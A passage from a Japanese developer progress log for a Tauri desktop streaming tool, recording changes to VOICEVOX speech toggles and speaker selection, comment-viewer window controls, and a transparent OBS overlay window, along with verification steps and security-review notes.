  capability/依存ゼロ・`csp: null` 不変 ③ 永続化は localStorage 非機密 boolean 2 値のみ ④ 読み上げ OFF 時に enqueue が走らない
  （`ttsEnabledRef` ゲート）⑤ WS は 1 本のまま（`enqueueForSpeech` 安定＝接続 effect 再実行なし）。
- **残課題（実機・本人環境）**: `pnpm --filter ./apps/desktop tauri dev` で トグル OFF で無音／ON で読み上げ＋クレジット（トグル直下）／
  読み上げ ON かつ ENGINE 未起動で自動起動（未登録は登録誘導）／自動連携 ON で窓オープン時に自動起動／両方 ON でも二重 spawn なし／
  再起動後もトグル状態保持、を目視。※実起動・実読み上げは要ローカル VOICEVOX ENGINE 登録。

### 変更ファイル（033c）

- frontend（新規）: `features/comment-viewer/ttsPrefs.ts`（トグル 2 値の load/save）
- frontend（変更）: `screens/comment-viewer/CommentViewerApp.tsx`（トグル state・永続化/ref 同期 effect・`enqueueForSpeech` ゲート・
  `handleLaunch`→`launchEngine`（3 段ガード）・自動起動 effect(A)/(B)・バナー条件に `ttsEnabled &&`・常時 credit 削除・SettingsView へ props
  受け渡し・`CREDIT_NOTICE` 削除）、`screens/comment-viewer/SettingsView.tsx`（`ToggleSwitch`・VOICEVOX パネル・`CREDIT_NOTICE` 受け入れ）、
  `screens/comment-viewer/CommentViewerApp.module.css`（`.voicevoxPanel`/`.toggleRow`/`.toggleLabel`/`.switch`/`.switchOn`/`.knob` 追加）
- docs: `docs/progress.md`（本記録）
- 不変（確認済み）: `ttsQueue.ts`/`voicevox.ts`（話者・合成ロジック＝033d）・`voicevoxApi.ts`（`launch_voicevox_engine` ラッパ）・
  `lib.rs`/Rust command 表面・`capabilities/*`・`tauri.conf.json`（`csp: null`）・依存（新規 crate/npm ゼロ）

### 修正（UX フィードバック反映）

- 本人指摘「**読み上げトグルは設定画面ではなく本体コメントビューに表示したい（そのほうが UX が良い）**」を反映。読み上げ
  ON/OFF は配信中に頻繁に切り替えるため、**「VOICEVOX読み上げ」トグルとクレジット（ON 時のみ・トグル直下）を本体
  コメントビューのツールバー直下へ移設**（新 `.voicevoxBar`）。**「VOICEVOX自動連携」は一度きりの設定なので設定ビューに残置**。
- `ToggleSwitch` を `SettingsView` の file-local 定義から `screens/comment-viewer/ToggleSwitch.tsx`（新規）へ切り出し、本体
  （読み上げ）と設定（自動連携）で共用。`CREDIT_NOTICE` は描画元の `CommentViewerApp.tsx` へ戻した。ゲート/自動起動/二重発火
  ガードのロジックは不変（トグルの表示位置のみ変更）。
- 検証: `pnpm --filter ./apps/desktop typecheck` / `lint` いずれも 0 error / 0 warning。ゲート・自動起動・二重 spawn 抑止・
  永続化・「新規 command/capability/依存ゼロ・`csp:null` 不変」は据え置き。
- 変更ファイル追補: 新規 `screens/comment-viewer/ToggleSwitch.tsx`／変更 `CommentViewerApp.tsx`（本体にトグル＋クレジット・
  `CREDIT_NOTICE` 復帰）・`SettingsView.tsx`（読み上げ関連を撤去し自動連携のみ）・`CommentViewerApp.module.css`（`.voicevoxBar` 追加）。

## 2026-07-19 (033d VOICEVOX 話者選択＋「ずんだもん読み上げ」→「VOICEVOX読み上げ」改名)

親 [033](tasks/033-comment-viewer-ux-revamp.md) の問題 6 に対応。読み上げ話者が `ZUNDAMON_NORMAL_SPEAKER_ID = 3` 固定だったのを、
設定ビューで **VOICEVOX 話者・スタイルを選べる**ようにした（話者→スタイルの 2 段 select）。話者固定でなくなるため、ユーザー向け
クレジット表記を**選択話者名に追従**させ（「VOICEVOX:<話者名>」）、表記を「VOICEVOX読み上げ」に統一。話者一覧取得のため
loopback allow-list に **`GET /speakers` を追加**（宛先 `127.0.0.1:50021` 不変・一覧のみ取得・端末外送信なし・新規依存ゼロ）。

### 実装内容

- **(1) `fetchSpeakers()`（`features/comment-viewer/voicevox.ts`）**: `GET ${VOICEVOX_BASE}/speakers` で `VoicevoxSpeaker[]`
  （`{ name, styles: [{ id, name }] }`）を取得。**GET・body 無し**でコメント本文/著者名/認証情報を送らず、応答は **name＋styles[{id,name}]
  のみ**に写像（丸ごと持ち回らない）。非 200/例外/非配列はすべて空配列（既存 `checkEngineRunning` の「例外を握って落とさない」作法）。
- **(2) 永続化（新規 `features/comment-viewer/speakerStorage.ts`）**: 選択 style id 1 個を localStorage 永続化。キー＝
  `stream-dock.comment-viewer.voicevox-speaker-id`、**未選択/不正/例外は既定 `DEFAULT_SPEAKER_ID = 3`（ずんだもんノーマル）**。
  `channelStorage.ts` と同方式（名前空間キー・直 read/write・握りつぶし・非機密・外部送信なし）。style id は話者横断で一意なので
  これだけで話者＋スタイルを復元できる。
- **(3) ttsQueue が選択話者を使う（`ttsQueue.ts`）**: `createTtsQueue({ getSpeakerId })` を追加し、`ttsQueue.ts:84` の固定
  `ZUNDAMON_NORMAL_SPEAKER_ID` を **合成直前に getter で読む選択値**へ差し替え（`getSpeakerId?.() ?? ZUNDAMON_NORMAL_SPEAKER_ID`）。
  グローバル直参照を避け、話者変更でキューを作り直さない（033c の ref 同期と同じ狙い）。既定フォールバック 3 は維持。
- **(4) 話者選択 UI／state 配線（`CommentViewerApp.tsx` / `SettingsView.tsx`）**: `CommentViewerApp` に `selectedSpeakerId`
  （`loadSpeakerId()` 初期化・`saveSpeakerId` 永続化 effect・`selectedSpeakerIdRef` 同期）と `speakers` state を追加。
  **ENGINE 稼働検知（`engineRunning === true`）で `fetchSpeakers()`** を 1 回叩いて一覧を埋める（`cancelled` ガード）。
  取得一覧に現在の選択 id が無ければ**先頭スタイルへ寄せる reconcile**（別バージョン ENGINE で消えた話者の未知 id 合成失敗を回避）。
  `SettingsView` の VOICEVOX セクションに**話者 select →スタイル select の 2 段**を追加（一覧空＝ENGINE 未起動時は現在の選択 id を
  保持したまま案内文）。`createTtsQueue` に `getSpeakerId: () => selectedSpeakerIdRef.current` を渡す。
- **(5) 改名（CREDIT_NOTICE 一般化）**: `CREDIT_NOTICE` 定数を `creditNotice(speakerName)` 関数へ。選択 style id を含む話者名を
  一覧から解決して「VOICEVOX:<話者名>」を促し、未取得時は「VOICEVOX:<話者名>」プレースホルダの汎用文にフォールバック（URL・規約準拠据え置き）。
  トグルラベルは 033c で既に「VOICEVOX読み上げ」。**らくらくツール（別機能）の「ずんだもん」表記は対象外**。内部定数
  `ZUNDAMON_NORMAL_SPEAKER_ID`（既定 3 を正しく表す）は維持。
- **(6) `docs/security.md` §1 例外(032c-c) 追記**: 許可メソッド列挙に **`GET /speakers`（話者・スタイル一覧の取得）** を追加し、
  「一覧取得のみ・本文/著者/認証を送らず端末外送信なし」を明記。宛先ループバック不変・`csp: null` 不変。

### 検証

- `pnpm --filter ./apps/desktop typecheck` / `lint` いずれも **0 error / 0 warning**（`git diff --stat`＝6 変更＋1 新規 / +223）。
- **security-review 通過（指摘なし）**: ① 宛先 `127.0.0.1:50021` ループバック不変（`VOICEVOX_BASE` 不変・新規ホストなし）② `/speakers` は
  GET・一覧取得のみで本文/著者/認証を送らず、返る一覧は state 保持のみ＝端末外送信なし・ログ出力なし ③ Rust に HTTP/音声ライブラリ・
  新規依存・新規 command/capability を足していない（`git status` で `.rs`/`Cargo.*`/`package.json`/`pnpm-lock.yaml`/`capabilities*`/
  `*.conf.json` 変更ゼロ確認）④ `docs/security.md` の許可メソッド列挙と実装の実叩き先（`/version`・`/speakers`・`/audio_query`・`/synthesis`）が一致。
- **残課題（実機・本人環境・要ローカル VOICEVOX ENGINE 起動）**: `pnpm --filter ./apps/desktop tauri dev` で 設定→話者・スタイル選択→
  選択話者で読み上げ／表記が「VOICEVOX読み上げ」統一／未選択時は既定 3（ずんだもんノーマル）／選択が再起動後も保持、を目視。

### 変更ファイル（033d）

- frontend（新規）: `features/comment-viewer/speakerStorage.ts`（style id の load/save・既定 3）
- frontend（変更）: `features/comment-viewer/voicevox.ts`（`VoicevoxSpeaker`/`VoicevoxStyle` 型＋`fetchSpeakers()`）、
  `features/comment-viewer/ttsQueue.ts`（`TtsQueueOptions.getSpeakerId`・合成の固定 id を getter へ）、
  `screens/comment-viewer/CommentViewerApp.tsx`（選択 state/ref・永続化/同期 effect・話者一覧 fetch＋reconcile・queue へ getter・
  `creditNotice()` 一般化・SettingsView へ props）、`screens/comment-viewer/SettingsView.tsx`（話者→スタイルの 2 段 select）、
  `screens/comment-viewer/CommentViewerApp.module.css`（`.voicevoxRow`/`.speakerField`/`.select` 追加）
- docs: `docs/security.md`（§1 例外(032c-c) の許可メソッドに `GET /speakers` 追記）、`docs/progress.md`（本記録）
- 不変（確認済み）: `lib.rs`/Rust command 表面・`capabilities/*`・`tauri.conf.json`（`csp: null`）・依存（新規 crate/npm ゼロ）・
  `voicevoxApi.ts`（`launch_voicevox_engine` ラッパ）

### 033e ツール管理でコメビュを再生/停止・起動済み表示（他ツールと統一・窓開閉から導出・mac 検証可）

内蔵コメントビューア（`ToolKind::Internal`）だけが「開く」ボタン 1 個（状態非依存）＋常時「内蔵」バッジという特別扱いだったのを、
他ツールと同じ **未起動＝再生／起動中＝停止＋「起動済み」表示** に揃えた。コメビュは PID プロセスではなく Tauri ウィンドウ
（label `comment-viewer`）のため、**PID registry には載せず窓の開閉状態から起動状態を導出**する（032c-a の「別窓を開くだけで PID 管理外」を踏襲）。

- **(1) Rust: 窓の停止/状態取得コマンドを追加（最小権限・自窓のみ・PID kill なし）**（`lib.rs`）:
  - `close_comment_viewer_window(app) -> AppResult<()>`: `get_webview_window("comment-viewer")` があれば `.close()`（無ければ no-op＝冪等）。
    `.close()` は既存の `CloseRequested | Destroyed → comment_sidecar::shutdown`（`open_comment_viewer_window` 内で登録・032c-b）を経由し
    **sidecar 停止も自動連動**する。エラーは固定安全文言に丸め、パス/OS エラーを露出しない。
  - `is_comment_viewer_open(app) -> bool`: `get_webview_window("comment-viewer").is_some()` を返す読み取り専用。
  - **窓状態取得は独立コマンド方式を採用**（`list_runtime_processes` へ合成しない）。理由: 合成は PID 用 `RuntimeProcess` 契約に window を
    混ぜて semantics を汚し実質「PID registry で管理」に寄る。独立読み取り専用の方が単一目的・最小権限で線引きが明確。
    **reconcile の呼び出し回数は不変**（既存 4 秒ポーラー 1 本のまま。1 回の reconcile 内で internal 行があるときだけ 1 IPC 追加）。
  - 両コマンドを `invoke_handler` の `open_comment_viewer_window` 直後に登録。`open_comment_viewer_window` の既存挙動は不変。
- **(2) frontend: ToolRow の internal 分岐を state 依存化**（`ToolRow.tsx`）:
  - status 列: 「内蔵」バッジを廃止し、url 以外は他ツールと同じ `StatusBadge`（開＝「起動済み」/ 閉＝「停止済み」）に統一（**ユーザー選択**）。
  - アクション列: `executable` と同型に。`running|launched`→「開く」（前面化）＋「停止」／`starting|stopping`→Spinner／それ以外→「起動」。
- **(3) frontend: MainScreen が窓状態を反映**（`MainScreen.tsx`・新規 `features/comment-viewer/windowApi.ts`）:
  - `reconcile()`: ガードを `hasInternal` も考慮（内蔵行があればポーリングでも窓状態を確認＝**窓を直接閉じた場合の「停止済み」追従**）。
    PID プロセスは `force || hasPid` のときだけ `listRuntimeProcesses()`（内蔵のみの preset では PID 用 IPC を打たない）。internal 行は
    `isCommentViewerOpen()` の結果から **開＝`running`／閉＝`stopped`** を導出（`starting|stopping` は据え置き・PID 分岐に入れない）。
  - internal 専用ハンドラ: 起動は既存 `launchTool`（→`open_comment_viewer_window`）を再利用、停止は `closeCommentViewerWindow()`。
    停止直後は窓存在判定のラグ回避のため `reconcile(true)` を呼ばず楽観更新＋4 秒ポーラーで確定（フリッカ回避）。
  - **除外条件の見直し**: `isCountedRow`（起動済みカウント用）は **internal を含める**（他ツールと表示統一）。`isBulkStoppableRow`
    （一括停止トグル用）は **internal を除外**（一括停止 `stop_preset_processes` は PID registry 経由で窓を閉じられないため。
    含めると「停止対象が無いのにトグル点灯」になる）。**コメビュは個別停止のみ・008/014 の一括停止の動作は不変**。`stopAll` の楽観
    「停止中」表示も `isBulkStoppableRow` に変更（閉じないのに「停止済み」になる誤り防止・Rust の停止対象は不変）。

**やらないこと（線引き遵守）**: internal を PID registry で管理／PID・プロセス名 kill／一括停止に窓 close を足す／`ToolKind` 拡張／
新規 capability・依存・外部通信／`csp: null` 変更／コメビュ本体 UI（033a〜d）・OBS（033f）。

**bindings drift**: 追加コマンドの戻り値は `AppResult<()>`（既存 `open_comment_viewer_window` と同型）と `bool`（プリミティブ）で
**新規 ts-rs 型ゼロ＝drift なし**。`pnpm --filter ./apps/desktop gen:bindings` 後に `features/**/bindings/**` の差分ゼロを確認
（regenerate で出た `rakuraku/bindings/ScanResult.ts` の差分は 032c-a のドキュメント更新由来の**既存 drift** で 033e とは無関係のため revert）。

**security-review 通過（指摘なし）**: ① 追加コマンドは自窓の open/close/存在確認に限定・PID kill／プロセス名 kill なし
② label `comment-viewer` ハードコードでラベル引数を frontend に露出しない単一目的（任意ラベル窓操作の汎用強権でない）
③ capability 不拡張（アプリ定義 command＝ACL 不要・`capabilities/*`・`tauri.conf.json` 変更ゼロを `git status` で確認）
④ `open_comment_viewer_window` 既存挙動不変・close 連動 sidecar 停止は既存経路（032c-b）どおり。新規外部通信・依存・ログ増なし。

**検証**: `pnpm --filter ./apps/desktop typecheck` / `lint`＝**0 error / 0 warning**、`cargo check`＝**Finished（0 error）**、
bindings drift ゼロ。変更 3 ファイル＋新規 1（`git diff --stat`: `lib.rs` +25 / `MainScreen.tsx` / `ToolRow.tsx`＋新規 `windowApi.ts`）。
**残課題（実機・本人環境）**: `pnpm --filter ./apps/desktop tauri dev` で 再生→窓オープン＋「起動済み」／停止→窓クローズ＋
sidecar 停止（`lsof -i` で sidecar 由来ソケット消滅）／窓を直接閉じて 4 秒以内に「停止済み」追従／PID ツールの起動・停止・一括起動/停止に退行なし、を目視。

### 変更ファイル（033e）

- Rust（変更）: `apps/desktop/src-tauri/src/lib.rs`（`close_comment_viewer_window`／`is_comment_viewer_open` 追加＋`invoke_handler` 登録）
- frontend（新規）: `apps/desktop/src/features/comment-viewer/windowApi.ts`（`closeCommentViewerWindow`／`isCommentViewerOpen` invoke ラッパ）
- frontend（変更）: `apps/desktop/src/screens/main/ToolRow.tsx`（status 列を StatusBadge に統一・internal アクション分岐を state 依存化）、
  `apps/desktop/src/screens/main/MainScreen.tsx`（reconcile の窓状態導出・internal 起動/停止ハンドラ・`isCountedRow`/`isBulkStoppableRow`・配線）
- docs: `docs/progress.md`（本記録）
- 不変（確認済み）: `capabilities/*`・`tauri.conf.json`（`csp: null`）・`process/*`（一括停止 `stop_preset_processes` の Rust 表面）・
  ts-rs 型（新規ゼロ）・依存（新規 crate/npm ゼロ）・`open_comment_viewer_window`

## 2026-07-19 (033f OBS 用透過オーバーレイ窓（ワンクリック）)

コメント一覧を OBS へ載せるため、**背景透過のオーバーレイ窓をワンクリックで開ける**ようにした（親 [033](tasks/033-comment-viewer-ux-revamp.md)
の問題 9）。ユーザーは OBS の「ウィンドウキャプチャ」でこの窓を取り込み、透過背景がそのまま抜ける。**追加依存・新規外部通信ゼロ**で、
既存のウィンドウ生成方式（`WebviewWindowBuilder`）と sidecar の loopback WS を再利用。obs-websocket 自動連携は親 033 方針どおり不採用。
**これで 033 系（033a〜f）が完了**。

> ※本節は 033f 本体時点（オーバーレイを **最前面 `always_on_top`** で開く）の記録。開いた窓の挙動はこの後の
> 「**追修正①**（最背面・非フォーカス化）」で **最背面 `always_on_bottom`＋`focused(false)`** に変更した。窓挙動の
> 最終状態は下記「追修正①／②」節を正とする（本節の `always_on_top`／`show()+set_focus()`／「最前面」記述は履歴）。

### 完了したこと

- **(1) Rust: 透過オーバーレイ窓を開くコマンド**（`lib.rs`・`open_comment_overlay_window` 新設＋`invoke_handler` 登録）:
  - Builder 設定: `.transparent(true).decorations(false).always_on_top(true).shadow(false)`＋`.inner_size(400,720)`／
    `.min_inner_size(240,320)`／`.title("StreamDock コメントオーバーレイ")`（OBS のウィンドウ一覧で選びやすく）。単一インスタンス
    ガード（既存なら `show()`＋`set_focus()` で前面化）は `open_comment_viewer_window` に倣う。
  - **sidecar 連動なし**: `comment_sidecar::ensure_started` を呼ばず・close イベントで `comment_sidecar::shutdown` も登録しない。
    sidecar 起動/停止契機はコメビュ窓の既存イベントに集約したまま＝**no-orphan 3 段 kill を壊さない**（オーバーレイ close で
    sidecar を落とさない）。sidecar 未起動時は WS 接続待ち＝0 件表示になるだけで副作用なし。
- **(2) tauri.conf 透過対応の要否＝要（macOS 私的 API）**（`tauri.conf.json`／`Cargo.toml`）: 実 crate ソースで確認したとおり
  macOS では `WebviewWindowBuilder.transparent()` が `feature = "macos-private-api"` で cfg gate され、**feature 無しでは
  `cargo check` がコンパイル不可**（実行時適用も同 feature gate）。`tauri.conf.json` の `macOSPrivateApi` は Tauri CLI
  （tauri dev/build）経路でのみ feature を自動付与するため、CLI を通らない `cargo check`（本タスクの検証コマンド）でも通るよう
  **`tauri` crate に `macos-private-api` feature を明示追加**（新規 crate 追加ではなく feature 追加＝028 の windows feature と同型）。
  `app.macOSPrivateApi: true` も併記（公式ドキュメント準拠）。`security.csp: null` は不変。macOS 私的 API 使用で MAS 配布不可に
  なるが .app/.dmg 直配布のため受容。
- **(3) capability 新設（最小権限）**（`capabilities/comment-overlay.json`）: `windows: ["comment-overlay"]`＋
  `permissions: ["core:default"]` のみ。`default.json`（main）・`comment-viewer.json` は**不変**（広い window scope・shell/fs 権限なし）。
- **(4) 共有 mergeComments 抽出**（新規 `features/comment-viewer/mergeComments.ts`）: 032c-a 以来 `CommentViewerApp` 内 local だった
  `mergeComments`＋`MAX_COMMENTS` を挙動不変で切り出し・export。`CommentViewerApp.tsx` は import に差し替え（`added` の TTS 用途は
  不変）。**本体とオーバーレイで完全に同じ append＋id 重複排除＋200 件クランプ**を保証。
- **(5) OverlayApp（背景透過・表示専用）**（新規 `screens/comment-viewer/OverlayApp.tsx`／`OverlayApp.module.css`）:
  - **読み取り専用接続**: `connectCommentStream({ onComments })` のみ。制御フレームメソッド（`startLogin`/`startSession`/`stopSession`）は
    一切呼ばない＝**送信フレームゼロ・新規外部通信ゼロ**。受信は共有 `mergeComments` で蓄積し `CommentList`（033b 分割）で描画。
    操作 UI（接続・設定・トグル）は持たない。cleanup の `disconnect()` もクライアント側 close のみ。
  - **背景透過**: 同一バンドルを全窓が読むため、`OverlayApp` の `useEffect` でこの窓の document にだけ `data-overlay="1"` を立て、
    module 内の属性ガード付き `:global(html[data-overlay="1"] …)` で `html`/`body`/`#root` を透明化（unmount で属性除去）。
    main/comment-viewer 窓には波及しない。コメントカードは `CommentList` 既存の不透明 surface のままで透明窓に浮く（装飾は最小・
    `CommentList` と共有 CSS は無改変）。
- **(6) App 分岐＋ラッパ＋本体ボタン**（`App.tsx`／`windowApi.ts`／`CommentViewerApp.tsx`＋module.css）:
  - `App.tsx` に `comment-overlay` ラベル分岐（→`OverlayApp`）。`windowApi.ts` に `openCommentOverlayWindow` invoke ラッパ。
  - **ボタン設置＝本体コメントビュー上部**（ユーザー選択）: `.toolbar` 右クラスタ（`.toolbarActions`）に「OBS オーバーレイ」ボタンを
    歯車の隣に追加。ツールバー直下に小さな注記（`.overlayHint`）で「初回のみ OBS でウィンドウキャプチャを追加し本窓を選択・背景は
    透過・閉じるは Cmd+W」を常時表示。`SettingsView.tsx` は無改変。閉じ方は標準 macOS メニュー（Cmd+W）で足りるため専用 close
    コマンドは作らない。

**やらないこと（線引き遵守）**: obs-websocket 自動ソース追加／オーバーレイの装飾・アニメ作り込み／オーバーレイからの接続・設定操作／
コメビュ本体 UI（033a〜d）・ツール管理（033e）／sidecar・no-orphan kill 契機の変更。

**bindings drift**: 追加コマンドは引数 `AppHandle`・戻り `AppResult<()>`（`open_comment_viewer_window` と同型）で**新規 ts-rs 型ゼロ**。
`pnpm --filter ./apps/desktop check:bindings`＝**32 passed・drift ゼロ**を確認。

**security-review 通過（指摘なし）**: ① オーバーレイ通信は loopback WS 読み取り専用に限定（制御フレーム送信なし・新規外部通信ゼロ・
main は no-internet 維持） ② `comment-overlay.json` は `core:default` 最小権限で `main`/`comment-viewer` を広げない ③ 新規依存ゼロ
（既存 `tauri` の feature 追加のみ）・`csp: null` 不変 ④ オーバーレイは sidecar を起動/停止せず close で落とさない（no-orphan kill 契機不変）。
透過・最前面窓は操作 UI を持たない表示専用でクリックジャック対象なし。

**検証**: `pnpm --filter ./apps/desktop typecheck` / `lint`＝**0 error / 0 warning**、`cargo check`（`macos-private-api` feature 有効で
`.transparent()` がコンパイル）＝**Finished（0 error）**、`check:bindings`＝**drift ゼロ**。
**残課題（実機・本人環境）**: `pnpm --filter ./apps/desktop tauri dev` で 「OBS オーバーレイ」→背景透過・フレームレス・最前面で開く／
オーバーレイとコメビュ本体で同一コメント／OBS ウィンドウキャプチャで透過合成／オーバーレイを Cmd+W で閉じても sidecar が落ちない／
`lsof -i` で外部 ESTABLISHED が sidecar PID 下のみ（オーバーレイ/main 本体 PID に出ない）、を目視。

### 変更ファイル（033f）

- Rust（変更）: `apps/desktop/src-tauri/src/lib.rs`（`open_comment_overlay_window` 追加＋`invoke_handler` 登録）
- 設定（変更）: `apps/desktop/src-tauri/tauri.conf.json`（`app.macOSPrivateApi: true`）、
  `apps/desktop/src-tauri/Cargo.toml`（`tauri` に `macos-private-api` feature＋理由コメント）
- capability（新規）: `apps/desktop/src-tauri/capabilities/comment-overlay.json`（`core:default` 最小権限）
- frontend（新規）: `apps/desktop/src/screens/comment-viewer/OverlayApp.tsx`／`OverlayApp.module.css`、
  `apps/desktop/src/features/comment-viewer/mergeComments.ts`
- frontend（変更）: `apps/desktop/src/App.tsx`（ラベル分岐）、`apps/desktop/src/features/comment-viewer/windowApi.ts`（ラッパ追加）、
  `apps/desktop/src/screens/comment-viewer/CommentViewerApp.tsx`（mergeComments を import 化・本体上部に OBS ボタン＋注記＋handler）、
  `apps/desktop/src/screens/comment-viewer/CommentViewerApp.module.css`（`.toolbarActions`／`.overlayHint` 追加）
- docs: `docs/progress.md`（本記録）
- 不変（確認済み）: `default.json`（main）・`comment-viewer.json`・`csp: null`・sidecar／no-orphan kill 経路・
  ts-rs 型（新規ゼロ）・依存（新規 crate/npm/plugin ゼロ）

### 033 系（033a〜f）完了

親 [033](tasks/033-comment-viewer-ux-revamp.md) の分割どおり 033a（デクラター）→033b（設定ビュー/接続UI移設）→033c（VOICEVOX トグル/
自動連携）→033d（話者選択/改名）→033e（ツール管理 再生/停止）→**033f（OBS 透過オーバーレイ）**をすべて実装・検証・security-review 済み。
コメビュ UX 刷新バッチは完了。

### 033f 追修正: オーバーレイを「最背面・非フォーカス」で開く（配信者の画面に前面表示しない）＋「閉じる」導線

**症状**: 033f のオーバーレイが `always_on_top(true)` で開くため、配信者自身の画面の**最前面に常時浮かんで邪魔**だった
（本人報告）。要望は「オーバーレイのコメントを自分の画面には前面表示せず OBS にだけライブ反映したい」。

**調査で確定**: macOS では OBS「ウィンドウキャプチャ」は窓を**画面上に存在（非最小化）**させないとライブ更新が凍結/黒画面に
なりやすい（最小化・別 Space・完全画面外は不安定）。一方 **背後に隠れた（occluded）窓は ScreenCaptureKit がライブ取り込み
できる**。よって「完全不可視」ではなく **最背面固定**が「前面に出さない × ライブ維持」の堅実解（**ユーザー選択も最背面方式**）。
Tauri Builder の実 API（`webview_window.rs`）で `always_on_bottom` / `focused` / `position` の存在を確認。

**修正内容**:
- **(1) Rust: オーバーレイを最背面・非フォーカスで開く**（`lib.rs` `open_comment_overlay_window`）:
  Builder を `.always_on_top(true)` → **`.always_on_bottom(true)` ＋ `.focused(false)`**（開くとき前面フォーカスを奪わない）に変更。
  `.position(24.0, 48.0)` で空デスクトップ時の「見え」を左上隅に寄せる。`.transparent/.decorations(false)/.shadow(false)`・
  サイズは不変。**再オープンガードの `set_focus()` を除去**（最背面窓を前面へ引き上げてちらつかせないため・`show()` のみ）。
- **(2) Rust: `close_comment_overlay_window` を新設＋登録**（`lib.rs`）: 033e の `close_comment_viewer_window` と同型
  （特定ラベル窓の `.close()`・無ければ no-op）。最背面・非フォーカスで Cmd+W が掴みにくいため本体から閉じられるようにする。
  **オーバーレイは sidecar を起動していないため `.close()` に shutdown 連動なし＝no-orphan kill 契機は不変**・PID/プロセス名 kill なし。
- **(3) frontend: 閉じる導線＋案内更新**（`windowApi.ts`／`CommentViewerApp.tsx`）: `closeCommentOverlayWindow()` ラッパ追加。
  本体上部ツールバー（`.toolbarActions`）に「OBS オーバーレイ」開くボタンの隣へ**「閉じる」ghost ボタン**を追加し配線
  （close は窓が無ければ no-op なので open 状態ポーリング不要）。注記（`.overlayHint`）を最背面挙動に更新
  （「常に最背面で開くので配信者の画面には前面表示されません／閉じるときは『閉じる』を押す」）。`SettingsView.tsx` 無改変・CSS 追加なし。

**やらないこと**: 完全不可視（最小化/別 Space/画面外・キャプチャ凍結リスク）／OBS ブラウザソース化（ローカル HTTP 新設＝新規
待受ソケット・親 033 方針外・別 security-review。将来検討）／sidecar・no-orphan kill 契機・main の no-internet・
オーバーレイの loopback WS 読み取り専用接続の変更。

**security-review 通過（指摘なし）**: 窓の表示属性変更のみで**新規外部通信・依存・capability・CSP 変更ゼロ**。
`close_comment_overlay_window` は特定ラベル窓 `.close()` のみ（PID/プロセス名 kill なし・sidecar 非連動＝no-orphan kill 契機不変・
§6 非該当）。新規 ts-rs 型ゼロ。

**検証**: `typecheck` / `lint`＝**0 error / 0 warning**、`cargo check`＝**Finished（0 error）**、`check:bindings`＝**drift ゼロ**。
**残課題（実機・本人環境）**: `tauri dev` で 「OBS オーバーレイ」→最背面で開き**自分の画面の前面に浮かない**／OBS ウィンドウ
キャプチャで**ライブ**透過合成（新規コメントで OBS 側も更新＝凍結しない）／「閉じる」で閉じ**コメビュ本体・sidecar は継続**、を目視
（※空デスクトップ部分で最背面のオーバーレイが小さく覗く場合は許容）。

### 変更ファイル（033f 追修正）

- Rust（変更）: `apps/desktop/src-tauri/src/lib.rs`（`open_comment_overlay_window` の Builder を最背面/非フォーカス化・
  再オープンの set_focus 除去／`close_comment_overlay_window` 追加＋`invoke_handler` 登録）
- frontend（変更）: `apps/desktop/src/features/comment-viewer/windowApi.ts`（`closeCommentOverlayWindow` 追加）、
  `apps/desktop/src/screens/comment-viewer/CommentViewerApp.tsx`（「閉じる」ボタン＋handler・注記文言更新）
- docs: `docs/progress.md`（本記録）
- 不変（確認済み）: `capabilities/comment-overlay.json`・`tauri.conf.json`（`macOSPrivateApi`）・`Cargo.toml`（`macos-private-api`）・
  `OverlayApp.tsx`／`OverlayApp.module.css`（読み取り専用・透過）・`csp: null`・依存（新規ゼロ）・ts-rs 型（新規ゼロ）

### 033f 追修正②: オーバーレイの「接続前は表示されない／反映ラグ」を解消（背景スロットリング無効化）＋合計表示を除去

**症状（本人報告）**: ①配信サイトに接続しないとオーバーレイが表示されない（接続前でも表示したい）②コメント取得から
オーバーレイ反映まで大きなラグがある（即時反映したい）③オーバーレイにコメント合計（「N 件」）は不要・コメントだけでよい。

**根本原因（①②の共通原因・実 crate ソース＋sidecar 調査で確定）**: 追修正①でオーバーレイを **最背面
（`always_on_bottom`）＋非フォーカス（`focused(false)`）** で開くようにしたため、その webview が macOS 上で「非アクティブ
（inactive）webview」となり、**WKWebView の既定 inactive scheduling ポリシー（＝タスクを完全 suspend）** が効いていた
→ 初回描画が接続まで paint されず（①）・受信後の描画/タイマーが throttle されてラグ（②）。
- Tauri は `WebviewWindowBuilder::background_throttling(BackgroundThrottlingPolicy)` を提供し、**未設定時の既定は
  Suspend**（`tauri_utils::config` doc）。wry は macOS14+/iOS17+ で `WKWebViewConfiguration.inactiveSchedulingPolicy` に反映
  （`Disabled → None`）。本機は **macOS 14.6.1** で有効。
- **sidecar は無罪（調査確定）**: comment-sidecar の WS サーバ（`apps/comment-sidecar/vendor/gateway/.../websocket-comment.output-port.ts`
  `broadcastMessage` `:197-205`）は `WebSocketServer.clients` 全員へ `comments.append` を**同期即ブロードキャスト**（単一
  クライアント上書き・per-client バッファ/throttle なし）。コメビュ本体と overlay は同時刻に同じフレームを受信するため、
  両窓の差は**受信後の窓側（webview アクティブ性＝throttling）**が原因。late-join への replay は無い（接続後のコメントから
  表示＝仕様どおり）・overlay は制御フレームを送らない読み取り専用でセッションに影響しない（追修正①の設計どおり）。

**修正内容（3 点・すべて最小・表示層）**:
- **(1) オーバーレイ webview の背景スロットリング無効化**（`lib.rs` `open_comment_overlay_window`）:
  Builder に **`.background_throttling(tauri::utils::config::BackgroundThrottlingPolicy::Disabled)`** を追加。最背面・非フォーカス
  でも suspend/throttle されず、**接続前でも即描画**（①）＋**コメントをリアルタイム反映**（②）。影響は overlay 窓のみ
  （comment-viewer / main は不変）。doc に理由追記。
- **(2) コメント合計を非表示**（`CommentList.tsx`／`OverlayApp.tsx`）: `CommentList` に任意 prop **`showCount?: boolean`**（既定 true）
  を追加し、false のとき先頭の `listHeader`（「N 件」）を描画しない。オーバーレイは `showCount={false}` を渡す（③）。コメビュ本体は
  prop 省略＝従来どおり合計表示。空時の `.empty`（「コメントはまだありません」）は残す（接続前に OBS で存在確認できる＝①の体験改善）。

**やらないこと**: 最背面/非フォーカス方針（追修正①）の変更／sidecar のプロトコル変更（無罪確定・Node sidecar は触らない）／
オーバーレイの装飾作り込み／main の no-internet・no-orphan kill 契機・loopback WS 読み取り専用の変更。

**security 自己確認（指摘なし）**: `background_throttling` は webview の描画/タイマーのスケジューリング設定のみ・`showCount` は
表示 prop のみで、**新規外部通信・依存・capability・CSP・tauri.conf・ts-rs 型ゼロ**。overlay の loopback WS 読み取り専用・
sidecar 非連動・no-orphan kill 契機は不変（通信/権限/プロセスに触れないため軽い自己確認で足りると判断）。

**検証**: `typecheck` / `lint`＝**0 error / 0 warning**、`cargo check`＝**Finished（0 error）**（`BackgroundThrottlingPolicy::Disabled`
